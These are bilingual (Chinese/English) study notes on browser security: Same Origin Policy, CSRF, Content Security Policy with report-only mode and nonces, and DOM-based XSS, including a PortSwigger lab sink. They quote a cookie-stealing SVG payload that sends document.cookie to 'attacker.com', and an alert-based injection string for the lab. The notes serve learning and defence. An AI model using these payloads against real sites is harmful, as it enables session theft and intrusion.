#### Content Security Policy (CSP)
- Same Origin Policy prohibits cross-origin fetch. 
> SOP 主要是为了保护被fetch的网站。但是SOP不禁止跨源提交表单，于是可以CSRF攻击。（没想到吧，让受害者访问攻击者网站，在受害者不知情的情况下偷偷带着cookie发送请求到目标网站比如转走处于登陆状态的受害者的银行账户里的钱财）。SOP也不禁止跨源加载静态资源，可以利用`<svg onload="'attacker.com?q='+document.cookie">`盗取cookie.（没有想到被fetch的网站反而是攻击者的吧，通过get请求在url中携带的参数把cookie偷走）
- Previously, we talked about ways to tighten up Same Origin Policy in terms of which sites could e.g. send requests with cookies to our site (CSRF)
    - That is, preventing other sites from making certain requests to our site 防御CSRF，在server端用origin allowlist
- CSP is inverse: prevent our site from making requests to other sites
    - CSP is an added layer of security against XSS
    - Even if attacker code is running in user's browser in our site's context, we can limit the damage they can do

In summary
1. SOP prevents cross site fetch
2. server side origin allowlist prevents CSRF
3. CSP prevents XSS

 CSP is set in HTTP response header. CSP blocks HTTP requests which would violate the policy. 比方说访问目标网站，相应的header里设置了CSP,可以让浏览器知道不能向`attacker.com`发请求。

 Goal: content comes from our site
 ```
 Content-Security-Policy: default-src 'self'
 ```
 可以相对路径加载，禁止跨源加载资源，也禁止inline脚本如`<script>alert(1)</script>`等

 Goal: content comes from our site, plus a trusted set of subdomains
 ```
 Content-Security-Policy: default-src 'self' *.trusted.com
 ```
 如果设置了`img-src`或者`scirpt-src`那么相应的资源是轮不到`default-src`其作用的（`default-src` is fallback）。

#### Deploy CSP on an existing site
Q: How do we figure out what the policy should be? What if we missing something? Site breaks. <br>
A: Deploy it in **report-only mode**. Policy is not enforced, but violations are reported to a provided URL.

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri https://example.com/report
```

#### Nonce
Server sends
```
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123'
```

```html
<script src='https://trusted.com' nonce='abc123'>
</script>
<script nonce='abc123'>foo()</script>
```

- When the attacker inject scripts without the nonce, they won't be allowed to run. 
- Attacker cannot figure out the nonce. Why? Because the header is not returned to the attacker, and, also, the attacker code cannot run to check the response page yet.
  - Nonce changes on each page load, and is unpredictable.


#### DOM-XSS

Q: 还是没理解插入到DOM和反射型xss的不一样，反射型xss不也是把插入到到html中吗，插入dom和插入html有什么不一样的？<br>
KIMI chat: 插入到DOM和反射型XSS之间的关键区别在于攻击的触发方式和数据流的处理。让我们更详细地解释一下：

##### 反射型XSS（Non-Persistent XSS）：
1. **数据流**：在反射型XSS中，攻击者构造一个包含恶意脚本的URL，这个URL被用户点击或通过电子邮件等方式发送给用户。
2. **服务器处理**：当用户访问这个URL时，服务器接收到请求并处理URL中的参数，然后将这些参数作为响应的一部分发送回用户的浏览器。
3. **插入HTML**：服务器生成的响应包含了恶意脚本，这个脚本被插入到HTML响应中，当用户的浏览器接收到这个响应并渲染页面时，恶意脚本被执行。
4. **触发条件**：恶意脚本的执行通常是由用户点击链接或提交表单触发的。

##### DOM-XSS：
1. **数据流**：在DOM-XSS中，恶意数据首先被加载到用户的浏览器中，可能是通过URL参数、表单提交、Cookie或其他方式。
2. **客户端处理**：这些数据被浏览器加载后，网页的JavaScript代码会处理这些数据，并将其插入到DOM中。
3. **插入DOM**：与反射型XSS不同，这里没有服务器参与将数据插入到HTML中的过程。相反，是客户端的JavaScript代码将数据动态地插入到DOM中。
4. **触发条件**：恶意脚本的执行是由客户端的JavaScript代码触发的，通常是用户与页面上的某些元素交互，如点击按钮或提交表单。

##### 插入DOM和插入HTML的区别：
- **处理位置**：插入HTML通常是由服务器端处理并发送给客户端的，而插入DOM是在客户端由JavaScript代码处理的。
- **执行时机**：插入HTML的恶意脚本在服务器响应的HTML页面被浏览器渲染时执行，而插入DOM的恶意脚本是在JavaScript代码执行时，将数据动态插入到DOM后执行。
- **攻击方式**：反射型XSS依赖于服务器将恶意数据作为响应发送给用户，而DOM-XSS依赖于客户端JavaScript代码将数据插入到DOM中。

简而言之，反射型XSS是服务器将恶意脚本作为响应发送给用户，而DOM-XSS是客户端JavaScript将数据动态插入到DOM中，然后执行。两者的主要区别在于攻击的触发点和数据处理的位置。

例子 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

这个页面有脚本
```html
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
</script>
```
其中`query`是通过GET请求url参数`search`传入，可以构造payload`" onload=alert(1) >//`